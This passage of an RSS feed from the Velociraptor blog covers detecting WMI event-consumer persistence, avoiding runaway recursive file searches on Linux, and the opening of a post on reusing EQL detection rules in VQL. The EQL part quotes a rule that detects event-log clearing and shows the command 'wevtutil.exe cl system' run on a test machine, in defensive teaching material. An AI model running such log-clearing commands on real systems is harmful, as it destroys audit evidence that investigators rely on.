 &lt;div data-featherlight="#07e245e677959853d6d32897b82bc2e9" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2022/2022-01-12-wmi-eventing/04WMIEventGeneration.png" alt="WMIEventingNoismaker.ps1:Generate active script EventConsumer">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="04WMIEventGeneration.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 WMIEventingNoismaker.ps1:Generate active script EventConsumer
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;h2 id="collection">Collection&lt;/h2>
&lt;p>Velociraptor has several valuable artifacts for hunting WMI Event
Consumers:&lt;/p>
&lt;ul>
&lt;li>&lt;code>Windows.Sysinternals.Autoruns&lt;/code> - leverages a thirdparty deployment of
Sysinternals Autoruns and typically my go to ASEP collection artifact but
limited by visibility in root/default and root/subscription only.&lt;/li>
&lt;li>&lt;code>Windows.Persistence.PermanentWMIEvents&lt;/code> - recently upgraded to query
all ROOT namespaces.&lt;/li>
&lt;/ul>

&lt;div class="mynotices tip">
 &lt;div heading=" Windows.Persistence.PermanentWMIEvents ">&lt;ul>
&lt;li>This artifact reports currently deployed permanent WMI Event Consumers.&lt;/li>
&lt;li>The artifact collects Binding information, then presents associated Filters and Consumers.&lt;/li>
&lt;li>Target a specific namespace, or tick &lt;code>AllRootNamespaces&lt;/code> to collect all
root namespace event consumers.&lt;/li>
&lt;/ul>
&lt;/div>
&lt;/div>


&lt;p>











&lt;figure id="5cba01649590b332579d1201014dc470">
 &lt;div data-featherlight="#5cba01649590b332579d1201014dc470" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2022/2022-01-12-wmi-eventing/05collection.png" alt="Windows.Persistence.PermanentWMIEvents: configuration options">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="05collection.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Windows.Persistence.PermanentWMIEvents: configuration options
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>











&lt;figure id="165083d9d77cc59b9d5dfa517f59d753">
 &lt;div data-featherlight="#165083d9d77cc59b9d5dfa517f59d753" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2022/2022-01-12-wmi-eventing/05collection_results.png" alt="Windows.Persistence.PermanentWMIEvents: results">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="05collection_results.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Windows.Persistence.PermanentWMIEvents: results
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;h4 id="telemetry">Telemetry&lt;/h4>
&lt;p>Unfortunately prior to Windows 10 WMI logging was fairly limited. Sysmon and
other telemetry sources often rely on WMI eventing itself to collect WMI
eventing telemetry events. That means custom classes require namespace and
class existence prior to telemetry subscription. Sysmon as seen below also
does not have coverage for root/default namespace.&lt;/p>
&lt;p>











&lt;figure id="d2d332d0529139a3510df7d8fb417e68">
 &lt;div data-featherlight="#d2d332d0529139a3510df7d8fb417e68" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2022/2022-01-12-wmi-eventing/03SysmonEid20.png" alt="Sysmon collection: Event ID 20 mapping (__EventConsumer)">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="03SysmonEid20.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Sysmon collection: Event ID 20 mapping (__EventConsumer)
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>The good news is since Windows 10, WMI logging has improved significantly
and we can now query the event log: Microsoft-Windows-WMI-Activity or
subscribe the underlying ETW provider of the same name. In the VQL below
I filter the ETW event on event consumer creation or delete operations.&lt;/p>
&lt;pre>&lt;code class="language-vql">SELECT
 System.TimeStamp AS EventTime,
 System.ID as EventId,
 strip(prefix='\\\\\.\\',string=EventData.NamespaceName) as NamespaceName,
 EventData.Operation as Operation,
 GetProcessInfo(TargetPid=int(int=EventData.ClientProcessId))[0] as Process
FROM watch_etw(guid=&amp;quot;{1418ef04-b0b4-4623-bf7e-d74ab47bbdaa}&amp;quot;)
WHERE EventId = 11
 AND Operation =~ 'WbemServices::(PutInstance|DeleteInstance|PutClass|DeleteClass)'
 AND Operation =~ 'EventConsumer|EventFilter|FilterToConsumerBinding'
&lt;/code>&lt;/pre>
&lt;p>I have included a completed artifact in the artifact exchange:
&lt;a href="https://docs.velociraptor.app/exchange/artifacts/pages/wmieventing/" target="_blank" >Windows.ETW.WMIEventing&lt;/a>
.
That artifact includes process enrichment, targeting both creation and deletion of EventConsumers.&lt;/p>
&lt;p>











&lt;figure id="e69728742d4be6ee10d00a3389e81c3d">
 &lt;div data-featherlight="#e69728742d4be6ee10d00a3389e81c3d" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2022/2022-01-12-wmi-eventing/06ETW.png" alt="Custom namespace provider registration and process enrichment">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="06ETW.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Custom namespace provider registration and process enrichment
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>











&lt;figure id="c938b279a732954169255d34893c60ce">
 &lt;div data-featherlight="#c938b279a732954169255d34893c60ce" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2022/2022-01-12-wmi-eventing/06ETWb.png" alt="Windows.ETW.WMIEventing: all operations event consumer creation and removal">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="06ETWb.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Windows.ETW.WMIEventing: all operations event consumer creation and removal
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;h4 id="event-log">Event Log&lt;/h4>
&lt;p>Similar filters can be used with &lt;code>Windows.EventLogs.EvtxHunter&lt;/code> for
detection. Its worthy to note, event logs hold less verbose logging for
the registration than ETW but this use case is helpful when coming late
to the party during an investigation.&lt;/p>
&lt;p>











&lt;figure id="9ca52546aa855bb94c888d8b25aa3432">
 &lt;div data-featherlight="#9ca52546aa855bb94c888d8b25aa3432" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2022/2022-01-12-wmi-eventing/07EvtxHunter.png" alt="Windows.EventLogs.EvtxHunter: hunt for event consumer string">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="07EvtxHunter.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Windows.EventLogs.EvtxHunter: hunt for event consumer string
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>











&lt;figure id="6075ca7ded597bcf9b092b4cca62ab88">
 &lt;div data-featherlight="#6075ca7ded597bcf9b092b4cca62ab88" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2022/2022-01-12-wmi-eventing/07EvtxHunterb.png" alt="Windows.EventLogs.EvtxHunter: detect event consumer class creation">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="07EvtxHunterb.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Windows.EventLogs.EvtxHunter: detect event consumer class creation
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;h1 id="conclusions">Conclusions&lt;/h1>
&lt;p>During this post, we have shown three techniques for detecting WMI event consumers
that are worth considering. We can collect these data-points over an entire
network in minutes using Velociraptor&amp;rsquo;s &amp;ldquo;hunt&amp;rdquo; capability. Similarly
Velociraptor notebook workflow assists excluding known good entries quickly as part of analysis.&lt;/p>
&lt;p>The Velociraptor platform aims to provide visibility and access
to endpoint data. If you would like to try Velociraptor it is available on Github under an open source license.
As always, please file issues on the bug tracker or ask questions on our
mailing list &lt;a href="mailto:velociraptor-discuss@googlegroups.com" >velociraptor-discuss@googlegroups.com&lt;/a>
. You can also chat with
us directly on discord at &lt;a href="https://www.velocidex.com/discord" target="_blank" >https://www.velocidex.com/discord&lt;/a>
&lt;/p>
&lt;h2 id="references">References&lt;/h2>
&lt;ol>
&lt;li>&lt;a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/about-wmi" target="_blank" >Microsoft documentation, About WMI&lt;/a>
&lt;/li>
&lt;li>&lt;a href="https://attack.mitre.org/techniques/T1546/003/" target="_blank" >MITRE ATT&amp;amp;CK T1546.003, Event Triggered Execution: Windows Management Instrumentation Event Subscription&lt;/a>
&lt;/li>
&lt;li>&lt;a href="https://www.youtube.com/watch?v=R5IEyoFpZq0" target="_blank" >Christensen.L and Graeber.M, Blackhat 2018 - Subverting Sysmon: Application of a Formalized Security Product Evasion Methodology&lt;/a>
&lt;/li>
&lt;li>&lt;a href="https://github.com/jsecurity101/Windows-API-To-Sysmon-Events/" target="_blank" >JSecurity101, Windows APIs To Sysmon-Events&lt;/a>
&lt;/li>
&lt;/ol></description></item><item><title>Searching for files</title><link>https://docs.velociraptor.app/blog/2022/2022-01-05-searching-for-files-on-linux/</link><pubDate>Wed, 05 Jan 2022 00:00:00 +0000</pubDate><guid>https://docs.velociraptor.app/blog/2022/2022-01-05-searching-for-files-on-linux/</guid><description>
&lt;div class="mynotices tip">
 &lt;div heading="tip">&lt;p>This article discusses new features appearing in Velociraptor&amp;rsquo;s 0.6.3
release. Earlier releases may not have the same features.&lt;/p>
&lt;/div>
&lt;/div>


&lt;p>Many DFIR tasks involve simply searching the filesystem for certain
files. In Velociraptor this capability is available through the
&lt;code>glob()&lt;/code> plugin, that uses a glob expressions (containing wild cards)
to search the filesystem. Additional VQL plugins can be used to
further filter and process the results.&lt;/p>
&lt;p>This capability is also available in many other tools, for example,
the &lt;code>find&lt;/code> native Linux command allows searching the filesystem, and
most programming languages have similar features. For example in
Python the
&lt;a href="https://docs.python.org/3/library/os.html#os.walk" target="_blank" >&lt;code>os.walk&lt;/code>&lt;/a>
 method,
or in Golang the
&lt;a href="https://pkg.go.dev/path/filepath#Walk" target="_blank" >filepath.Walk&lt;/a>
 method. The
following discussion applies equally to all methods and is also
relevant for single use scripts.&lt;/p>
&lt;h2 id="the-log4j-vulnerability">The Log4j vulnerability&lt;/h2>
&lt;p>The Log4j vulnerability has been published in December 2021. Due to
the high severity and ease of exploitation many blue teamers scrambled
to identify the presence of vulnerable software on servers. A myriad
of scripts and single use tools were published that could search the
filesystem for vulnerable jar files (e.g. &lt;code>find&lt;/code> based scripts
&lt;a href="https://github.com/yahoo/check-log4j" target="_blank" >&lt;code>yahoo/check-log4j&lt;/code>&lt;/a>
,
&lt;a href="https://github.com/rubo77/log4j_checker_beta" target="_blank" >&lt;code>rubo77/log4j_checker_beta&lt;/code>&lt;/a>
,
Go based
&lt;a href="https://github.com/palantir/log4j-sniffer" target="_blank" >&lt;code>palantir/log4j-sniffer&lt;/code>&lt;/a>
 ).&lt;/p>
&lt;p>I wanted to share some of the potential pitfalls that one may
encounter searching the filesystem in the real world. In particular
some of these issues may present performance problems so should be
kept in mind when writing custom one off scripts, or new Velociraptor
artifacts.&lt;/p>
&lt;h2 id="following-symlinks">Following Symlinks&lt;/h2>
&lt;p>A symbolic link is a special type of filesystem object which points at
another file or directory. When walking the files in a directory, one
needs to decide if to follow the symbolic link or not.&lt;/p>
&lt;p>If one follows the symbolic link and recurse into a directory which a
link points to, there is a danger that the link points back to a
higher place in the directory tree, leading to a symbolic link cycle.&lt;/p>
&lt;p>A program that blindly follows links may become trapped in a symbolic
link cycle. This is particularly problematic when recursing through
the &lt;code>/proc&lt;/code> filesystem, which contains links to / (e.g. a process&amp;rsquo;s
working directory).&lt;/p>
&lt;p>For example the below snippet can be seen with find, when instructed
to follow symbolic links:&lt;/p>
&lt;pre>&lt;code class="language-sh"># find -L /proc
/proc/self/task/1702267/root/lib/modules/5.11.0-44-generic/build/include/config/memstick/realtek
/proc/self/task/1702267/root/lib/modules/5.11.0-44-generic/build/include/config/memstick/realtek/usb.h
/proc/self/task/1702267/root/lib/modules/5.11.0-44-generic/build/include/config/memstick/realtek/pci.h
/proc/self/task/1702267/root/lib/modules/5.11.0-44-generic/build/include/config/hid.h
/proc/self/task/1702267/root/lib/modules/5.11.0-44-generic/build/include/config/alim7101
/proc/self/task/1702267/root/lib/modules/5.11.0-44-generic/build/include/config/alim7101/wdt.h
/proc/self/task/1702267/root/lib/modules/5.11.0-44-generic/build/include/config/snd.h
&lt;/code>&lt;/pre>
&lt;p>Such a program will never complete because each item in proc will cause
&lt;code>find&lt;/code> to recurse through the entire filesystem until recursively
entering &lt;code>/proc&lt;/code> again!&lt;/p>
&lt;p>This is particularly dangerous when running this program remotely
using a tool that has no ability to constrain the time, CPU usage or
returned rows of external programs. This can lead to huge CPU
consumption on the target system and spinning out of control programs.&lt;/p>
&lt;p>This is probably the reason why &lt;code>find&lt;/code>&amp;rsquo;s default behavior is to
&lt;strong>not&lt;/strong> follow symbolic links. However if not following symbolic links
it is possible to miss important files (for example many servers
contain symlinks to data drives so starting a find from &lt;code>/var/www&lt;/code>
might miss files).&lt;/p>
&lt;p>Velociraptor&amp;rsquo;s &lt;code>glob()&lt;/code> plugin does follow links by default, but keeps
track of visited inodes in order to detect cycles. This can still lead
to unintended loops especially when recursing through the &lt;code>/proc&lt;/code>
filesystem.&lt;/p>
&lt;h2 id="remote-filesystems">Remote filesystems&lt;/h2>
&lt;p>Many servers have distributed filesystems mounted at various points in
the filesystem. Running a large recursive search may recurse into
these remote filesystems which may be absolutely huge. Recursing into
these remote files can also lead to very long network delays
essentially preventing the search from completing at all!&lt;/p>
&lt;p>It is difficult to predict in advance where remote filesystems are
mounted - especially when running a search on an unknown server. (This
situation is also present when mounting a filesystem over &lt;code>fuse&lt;/code> for
example, a vmware shared folder).&lt;/p>
&lt;p>The &lt;code>find&lt;/code> command has a &lt;code>-xdev&lt;/code> option that restricts searching to a
single filesystem. This flag ensures that &lt;code>find&lt;/code> does not recurse into
remote mounted filesystems. As an added bonus &lt;code>-xdev&lt;/code> also prevents
recursing into the &lt;code>/proc&lt;/code> filesystem (which can be problematic as
described above)&lt;/p>
&lt;p>Unfortunately many Unix systems have separate partitions for &lt;code>/home&lt;/code>,
&lt;code>/usr&lt;/code> or &lt;code>/boot&lt;/code> and so preventing recursion into other filesystems
can prevent finding files in those partitions.&lt;/p>

&lt;div class="mynotices note">
 &lt;div heading=" Bind mounts ">&lt;p>In Linux it is possible to create a &lt;code>bind&lt;/code> mount using the &lt;code>--bind&lt;/code>
flag to mount another directory again inside a mount point
directory. This is similar to a symlink in the sense that it may point
further up the directory tree creating extra work for the &lt;code>find&lt;/code>
command.&lt;/p>
&lt;p>For example:&lt;/p>
&lt;pre>&lt;code># mkdir /root/bount
# mount --bind / /root/bound/
# find /root/
...
/root/bound/usr/i686-w64-mingw32/lib/libcabinet.a
/root/bound/usr/i686-w64-mingw32/lib/binmode.o
find: File system loop detected; ‘/root/bound/root’ is part of the same file system loop as ‘/root/’.
&lt;/code>&lt;/pre>
&lt;p>The &lt;code>find&lt;/code> command is able to detect these kinds of filesystem loops
and not get trapped but a custom program may not.&lt;/p>
&lt;/div>
&lt;/div>


&lt;h1 id="the-glob-plugin">The glob plugin&lt;/h1>
&lt;p>Velociraptor&amp;rsquo;s &lt;code>glob()&lt;/code> plugin is the usual way that file searching is
implemented. Conceptually it is simple, to use - just provide a
wildcard expression and the glob plugin returns all the files that
match it. For example, one might be tempted to run the following query
looking for files with the &lt;code>.pem&lt;/code> extension:&lt;/p>
&lt;pre>&lt;code class="language-vql">SELECT FullPath
FROM glob(globs=&amp;quot;/**/*.pem&amp;quot;)
&lt;/code>&lt;/pre>
&lt;p>On Linux such a query might encounter some problems! The &lt;code>glob()&lt;/code>
plugin by default follows symlinks and as soon as the glob plugin
enters the &lt;code>/proc&lt;/code> directory the plugin will likely encounter a
symlink further up the filesystem (usually back to /) and continue
recursing through that.&lt;/p>
&lt;p>











&lt;figure id="964a7b5fa0265ba2bb020210a757dac4">
 &lt;div data-featherlight="#964a7b5fa0265ba2bb020210a757dac4" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2022/2022-01-05-searching-for-files-on-linux/glob_proc.png" alt="Recursing through the /proc filesystem">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="glob_proc.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Recursing through the /proc filesystem
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>We can disable following symlinks using the nosymlink option to
glob. However this query will also take a very long time on this
system:&lt;/p>
&lt;p>











&lt;figure id="9abbe70a20b6e2a3797960245896cc50">
 &lt;div data-featherlight="#9abbe70a20b6e2a3797960245896cc50" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2022/2022-01-05-searching-for-files-on-linux/glob_network.png" alt="Recursing into a network mount">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="glob_network.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Recursing into a network mount
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>This test system has a large remote filesystem mounted on &lt;code>/shared/&lt;/code>
so any recursion into that directory will be very slow.&lt;/p>
&lt;h2 id="excluding-recursion-into-certain-directories">Excluding recursion into certain directories&lt;/h2>
&lt;p>Supposed that in this case we don&amp;rsquo;t really care about remote
filesystems, we just want to search for pem files in the local
system. We know that certain directories should be excluded so we
might be tempted to write a query like:&lt;/p>
&lt;pre>&lt;code class="language-vql">SELECT FullPath
FROM glob(globs=&amp;quot;/**/*.pem&amp;quot;)
WHERE NOT FullPath =~ &amp;quot;^/(proc|shared)&amp;quot;
&lt;/code>&lt;/pre>
&lt;p>This query uses a WHERE clause to filter out any paths starting with
&lt;code>/proc&lt;/code> or &lt;code>/shared&lt;/code>. While this seems reasonable it does not work!
Thinking back to how VQL works (See &lt;a href="https://docs.velociraptor.app/docs/vql/#life-of-a-query" >Life of a Query&lt;/a>
 ), the &lt;code>glob()&lt;/code> plugin will expand
the full glob into the query, and the WHERE clause simply filters out
non-matching rows. Therefore &lt;code>glob()&lt;/code> will still get stuck in proc or
shared as before!&lt;/p>
&lt;p>We need a way to tell the glob plugin itself &lt;strong>not&lt;/strong> to recurse into
certain directories at all to save the unnecessary work. Since 0.6.3
the &lt;code>glob()&lt;/code> plugin can accept a &lt;code>recursion_callback&lt;/code> argument. This
is a VQL lambda function that receives the full row and return a
boolean to decide if the directory should be recursed into. If the
lambda returns FALSE, the glob plugin does not bother to enter the
directory at all, therefore saving a lot of effort.&lt;/p>
&lt;p>











&lt;figure id="6736329e3b5e0610d54bb8a45e13126c">
 &lt;div data-featherlight="#6736329e3b5e0610d54bb8a45e13126c" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2022/2022-01-05-searching-for-files-on-linux/glob_recursion_callback.png" alt="Controlling recursion in the glob plugin">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="glob_recursion_callback.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Controlling recursion in the glob plugin
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>In the above example, we used the VQL lambda returning true only for directories that have a path not starting with &lt;code>shared&lt;/code> or &lt;code>proc&lt;/code> or &lt;code>snap&lt;/code>:&lt;/p>
&lt;pre>&lt;code class="language-vql">x =&amp;gt; NOT x.FullPath =~ '^/(shared|proc|snap)'
&lt;/code>&lt;/pre>
&lt;h2 id="more-powerful-recursion-callbacks">More powerful recursion callbacks&lt;/h2>
&lt;p>While controlling recursion using the directory path works well on
this system, we typically want to develop a more generalized solution
that we can apply to more systems. Ultimately, we can not predict
where various filesystems are mounted based on the path, but we just
want to ensure that we do not recurse into remote filesystems, or
virtual filesystems.&lt;/p>
&lt;p>The &lt;code>recursion_callback&lt;/code> mechanism is very flexible and allows us to
choose arbitrary conditions to control the recursion. Can we determine
what type of filesystem a particular file resides on?&lt;/p>
&lt;p>On Linux, the &lt;code>stat&lt;/code> filesystem call returns a &lt;code>device&lt;/code> field. You can see
this with a simple stat shell command:&lt;/p>
&lt;pre>&lt;code class="language-bash"># stat /etc/passwd
 File: /etc/passwd
 Size: 2292 Blocks: 8 IO Block: 4096 regular file
Device: fd00h/64768d Inode: 540077 Links: 1
Access: (0644/-rw-r--r--) Uid: ( 0/ root) Gid: ( 0/ root)
Access: 2022-01-06 22:08:44.793600319 +1000
Modify: 2021-12-09 17:19:40.768596398 +1000
Change: 2021-12-09 17:19:40.768596398 +1000
 Birth: 2021-12-09 17:19:40.768596398 +1000
&lt;/code>&lt;/pre>
&lt;p>The &lt;code>Device&lt;/code> field is actually broken into two parts - the device
major part and the device minor part (8 bits each). These correspond
to the device shown in &lt;code>/dev/&lt;/code> (&lt;code>fd00&lt;/code> represents major &lt;code>0xfd&lt;/code> (253)
and minor 0):&lt;/p>
&lt;pre>&lt;code class="language-bash"># ls -l /dev/dm-0
brw-rw-r-- 1 root disk 253, 0 Jan 6 01:55 /dev/dm-0
&lt;/code>&lt;/pre>
&lt;p>The device major number represents the device driver that is
responsible for this filesystem, listed in &lt;code>/proc/devices&lt;/code>:&lt;/p>
&lt;pre>&lt;code>Block devices:
 7 loop
 8 sd
 9 md
 11 sr
 65 sd
 66 sd
 67 sd
 68 sd
 69 sd
 70 sd
 71 sd
128 sd
129 sd
130 sd
131 sd
132 sd
133 sd
134 sd
135 sd
253 device-mapper
254 mdp
259 blkext
&lt;/code>&lt;/pre>
&lt;p>The glob plugin can provide filesystem specific information in the
&lt;code>Data&lt;/code> column:&lt;/p>
&lt;p>











&lt;figure id="5cee0287bc32ee0dc954ffd99204e692">
 &lt;div data-featherlight="#5cee0287bc32ee0dc954ffd99204e692" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2022/2022-01-05-searching-for-files-on-linux/device_major.png" alt="Device major and minor numbers">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="device_major.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Device major and minor numbers
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>Major numbers larger than 7 are considered &amp;ldquo;local&amp;rdquo;. The following
query can therefore stay on the locally attached devices excluding the
loopback mounted filesystems:&lt;/p>
&lt;pre>&lt;code class="language-vql">SELECT FullPath
FROM glob(globs='/**/*.pem',
 recursion_callback='x=&amp;gt;x.IsLink OR x.Data.DevMajor &amp;gt; 7')
&lt;/code>&lt;/pre>
&lt;p>This query is very efficient, following links but skipping /proc,
remote filesystems but covering additional attached storage. We do not
need to rely on guessing where remote filesystems are mounted, and
excluding only those directories, instead limiting recursion to the
type of device hosting the filesystem.&lt;/p>
&lt;h1 id="conclusions">Conclusions&lt;/h1>
&lt;p>Searching files on the filesystems seems like a simple operation, but
can represent a number of pitfalls - particularly when run against
Linux system with unusual configuration. Not considering these issues
may result in runaway processes and severe load on the target systems.&lt;/p>
&lt;p>It is difficult to predict how much work a recursive search will
perform so tools should have safety built in, such as timeouts
(Velociraptor&amp;rsquo;s default 600 second timeout will cancel the search),
limits on number of rows returned or directory traversal depth
limitation (Velociraptor&amp;rsquo;s glob expressions can specify a recursion
depth).&lt;/p>
&lt;p>The &lt;code>find&lt;/code> commandline tool has some safety mechanisms built in such
as cycle detection, in addition to the &lt;code>-xdev&lt;/code> option limiting
recursion to a single filesystem. Any custom code needs to replicate
these mechanisms.&lt;/p>
&lt;p>Velociraptor&amp;rsquo;s &lt;code>glob()&lt;/code> plugin has fine grained controls allowing
coverage of only a small set of filesystem types, or mount
points. This allows Velociraptor to safely search the entire system
for files balancing coverage with the risk following symlinks.&lt;/p></description></item><item><title>EQL to VQL - Leverage EQL based detection rules in Velociraptor</title><link>https://docs.velociraptor.app/blog/2021/2021-11-09-eql2vql/</link><pubDate>Tue, 09 Nov 2021 00:00:00 +0000</pubDate><guid>https://docs.velociraptor.app/blog/2021/2021-11-09-eql2vql/</guid><description>
&lt;div class="mynotices warning">
 &lt;div heading=" Outdated content ">&lt;p>This article describes a threat detection approach that has since been
superseded by Velociraptor&amp;rsquo;s &lt;a href="https://docs.velociraptor.app/blog/2023/2023-11-15-sigma_in_velociraptor/" >built-in Sigma
functionality&lt;/a>
,
however it is retained here for historical and instructive purposes since it
also demonstrates how the flexibility of VQL makes novel solutions possible.&lt;/p>
&lt;/div>
&lt;/div>


&lt;p>If you have been following the development of Velociraptor for a while
you are probably more than familiar with Velociraptor&amp;rsquo;s flexible query
language (VQL). Because Velociraptor is an agent running on the
endpoint, VQL facilitates access to all manners of data sources, from
event logs, event tracing for Windows (ETW) to live analysis and
triaging - all orchestrated using VQL as the flexible glue language.&lt;/p>
&lt;p>While VQL can be used for hunting or detection, many traditional
threat hunting platforms work by forwarding logs to a central location
and then running queries over the aggregate data from all
endpoints. There is a large body of existing work in detection queries
or threat intelligence feeds designed to work on top of a central data
mining solution such as Elastic or Splunk. We have been wondering for
a while how to make use of that existing logic within Velociraptor. By
reusing existing detection resources in different contexts, we are
able to enhance their overall effectiveness.&lt;/p>
&lt;p>In this post we discuss how to leverage detections targeting EQL (an
Elastic search query) within Velociraptor. I thought it would also be
interesting to discuss the main differences between more traditional
logs aggregation solutions (such as Elastic or Splunk) and
Velociraptor&amp;rsquo;s endpoint centric design.&lt;/p>
&lt;h2 id="what-is-eql-anyway">What is EQL anyway?&lt;/h2>
&lt;p>The &lt;a href="https://www.elastic.co/blog/introducing-event-query-language" target="_blank" >Event Query
Language&lt;/a>

(EQL), is a query language designed to identify specific conditions in
collected telemetry from endpoints in order to implement detections of
anomalous behavior.&lt;/p>
&lt;p>EQL forms a central part of the Elastic detection platform and has a
large number of &lt;a href="https://github.com/elastic/detection-rules" target="_blank" >existing detection
rules&lt;/a>
. It is also a
target for some other threat detection platforms, for example
&lt;a href="https://github.com/SigmaHQ/sigma" target="_blank" >Sigma&lt;/a>
 can generate EQL queries
from Sigma rules.&lt;/p>
&lt;p>By implementing EQL support for Velociraptor we can leverage the
existing resources and use them in a wider context - as we will see
below.&lt;/p>
&lt;h2 id="how-do-eql-detections-work">How do EQL detections work?&lt;/h2>
&lt;p>EQL detections are part of the wider Elastic solution - which is
pretty typical for traditional centrally processed SIEM based systems:&lt;/p>
&lt;ol>
&lt;li>
&lt;p>Events are collected from the endpoint using a collection
agent. Commonly the agent is
&lt;a href="https://www.elastic.co/beats/winlogbeat" target="_blank" >winlogbeat&lt;/a>
 collecting
&lt;a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon" target="_blank" >Sysmon&lt;/a>

generated events, providing process execution logs, file and
registry modification events and DNS lookup events.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>The data is transformed on the endpoint into a standard data schema
for transmission into the Elastic server. EQL relies on the data being in
&lt;a href="https://www.elastic.co/guide/en/ecs/current/index.html" target="_blank" >Elastic Common
Schema&lt;/a>
 so
it can be indexed by the backend.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>The transformed data is received on the server and fed into large
scale data mining warehouse (e.g. The Elastic search server) where
it is aggregated and indexed.&lt;/p>
&lt;/li>
&lt;li>
&lt;p>Detection queries are applied on the data mining engine to detect
anomalies.&lt;/p>
&lt;/li>
&lt;/ol>
&lt;p>The following diagram illustrates the process&lt;/p>
&lt;p>











&lt;figure id="aee748bffd27c06a1a5a52a27972a555">
 &lt;div data-featherlight="#aee748bffd27c06a1a5a52a27972a555" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-11-09-eql2vql/eql_lifecycle.png" alt="Life of an EQL event">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="eql_lifecycle.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 Life of an EQL event
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>Let&amp;rsquo;s work through a specific example of a Sysmon event as it works
its way through the EQL echo-system, eventually matching the
&lt;a href="https://github.com/elastic/detection-rules/blob/main/rules/windows/defense_evasion_clearing_windows_event_logs.toml" target="_blank" >following
detection&lt;/a>
:&lt;/p>
&lt;pre>&lt;code class="language-py">process where event.type in (&amp;quot;process_started&amp;quot;, &amp;quot;start&amp;quot;) and
 (process.name : &amp;quot;wevtutil.exe&amp;quot; or process.pe.original_file_name == &amp;quot;wevtutil.exe&amp;quot;) and
 process.args : (&amp;quot;/e:false&amp;quot;, &amp;quot;cl&amp;quot;, &amp;quot;clear-log&amp;quot;) or
 process.name : (&amp;quot;powershell.exe&amp;quot;, &amp;quot;pwsh.exe&amp;quot;, &amp;quot;powershell_ise.exe&amp;quot;) and process.args : &amp;quot;Clear-EventLog&amp;quot;
&lt;/code>&lt;/pre>
&lt;p>The above rule is looking for process executions, where the
&lt;code>wevtutil.exe&lt;/code> program is run with command line arguments matching
&amp;ldquo;cl&amp;rdquo; or &amp;ldquo;clear-log&amp;rdquo; (Or the equivalent powershell)&lt;/p>
&lt;p>What happens when I run the command &lt;code>wevtutil.exe cl system&lt;/code> on my
test system?&lt;/p>
&lt;p>Sysmon will detect the process start and write an event into the
system event log.&lt;/p>
&lt;p>











&lt;figure id="7cd47cf166374324f7fc3d036ad685d0">
 &lt;div data-featherlight="#7cd47cf166374324f7fc3d036ad685d0" class="figure">
 &lt;img src="https://docs.velociraptor.app/blog/2021/2021-11-09-eql2vql/sysmon_event.png" alt="A typical Sysmon Event">
 &lt;/div>
 &lt;figcaption>
 &lt;a class="image-link" href="sysmon_event.png">&lt;i class="fa fa-download">&lt;/i>&lt;/a>
 A typical Sysmon Event
 &lt;/figcaption>
&lt;/figure>




&lt;/p>
&lt;p>Eventually the event will be forwarded to the Elastic stack, detection
queries run over it and potentially an alert will be escalated.&lt;/p>
&lt;p>Since we know this event will trigger the EQL detection, let&amp;rsquo;s see how
Sysmon event fields are mapped into the ECS fields that the EQL query
works on.&lt;/p>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Sysmon Field&lt;/th>
 &lt;th>ECS Field&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
